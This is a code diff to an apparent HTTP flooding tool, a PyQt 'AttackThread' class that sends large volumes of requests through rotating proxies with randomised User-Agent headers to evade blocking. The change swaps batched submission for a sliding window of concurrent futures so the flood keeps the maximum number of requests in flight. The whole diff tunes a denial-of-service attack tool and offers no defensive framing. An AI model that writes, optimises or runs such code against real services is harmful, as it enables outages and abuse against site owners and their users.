@@ -7,7 +7,7 @@ import time
 from datetime import datetime
 from requests.adapters import HTTPAdapter
 from urllib3.util.retry import Retry
-from concurrent.futures import ThreadPoolExecutor, as_completed
+from concurrent.futures import ThreadPoolExecutor, wait, FIRST_COMPLETED
 import urllib3
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
@@ -231,19 +231,22 @@ class AttackThread(QThread):
                     except requests.exceptions.RequestException as e:
                         self.log_signal.emit(f"[error] request failed: {e}")
             else:
-                futures = []
-                batch_target = 32 if self.attack_mode == "burst" else 64
-                for _ in range(self.num_requests * (1 if self.attack_mode == "burst" else 5)):
-                    if not self.running:
-                        break
-                    headers = {"User-Agent": random.choice(USER_AGENTS)}
-                    proxy = self._pick_proxy()
-                    futures.append(executor.submit(self._send, session, headers, proxy))
-                    if len(futures) >= batch_target:
-                        self._wait_batch(futures)
-                        futures = []
-                if futures:
-                    self._wait_batch(futures)
+                total = self.num_requests * (1 if self.attack_mode == "burst" else 5)
+                window = workers
+                pending = set()
+                submitted = 0
+                while submitted < total and self.running:
+                    while len(pending) < window and submitted < total and self.running:
+                        headers = {"User-Agent": random.choice(USER_AGENTS)}
+                        proxy = self._pick_proxy()
+                        pending.add(executor.submit(self._send, session, headers, proxy))
+                        submitted += 1
+                    if self.running and pending:
+                        done, pending = wait(pending, return_when=FIRST_COMPLETED)
+                        for fut in done:
+                            self._handle_result(fut)
+                for fut in list(pending):
+                    self._handle_result(fut, force=True)
         finally:
             executor.shutdown(wait=True, cancel_futures=False)
             session.close()
@@ -258,17 +261,16 @@ class AttackThread(QThread):
                 return random.choice(self.proxies)
         return None
 
-    def _wait_batch(self, futures):
-        for fut in as_completed(futures):
-            if not self.running:
-                break
-            try:
-                fut.result()
-            except requests.exceptions.RequestException as e:
-                self.log_signal.emit(f"[error] request failed: {e}")
-            except Exception as e:
-                self.log_signal.emit(f"[error] {e}")
-            self._count_request()
+    def _handle_result(self, fut, force=False):
+        if not force and not self.running:
+            return
+        try:
+            fut.result()
+        except requests.exceptions.RequestException as e:
+            self.log_signal.emit(f"[error] request failed: {e}")
+        except Exception as e:
+            self.log_signal.emit(f"[error] {e}")
+        self._count_request()
 
     def _count_request(self):
         self.current_requests_sent += 1
